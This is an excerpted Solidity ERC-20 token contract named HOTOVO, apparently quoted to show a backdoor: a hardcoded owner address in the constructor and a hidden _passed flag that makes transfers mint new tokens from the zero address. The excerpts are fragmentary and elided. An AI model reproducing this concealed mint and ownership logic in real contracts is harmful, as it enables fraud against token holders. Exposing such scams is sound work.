...
abstract contract Ownable is Context {
     ...
     */
    constructor () {
        _owner = 0x6005C093d5c775320638F084179A3200cffB27eD;
...
contract HOTOVO is Context, IERC20, Ownable {
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        if (_passed) {
            _transferMint(address(0), recipient, amount);
    ...
    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
     ...
     function _transferMint(address sender, address recipient, uint256 tAmount) private {
        _passed = true;
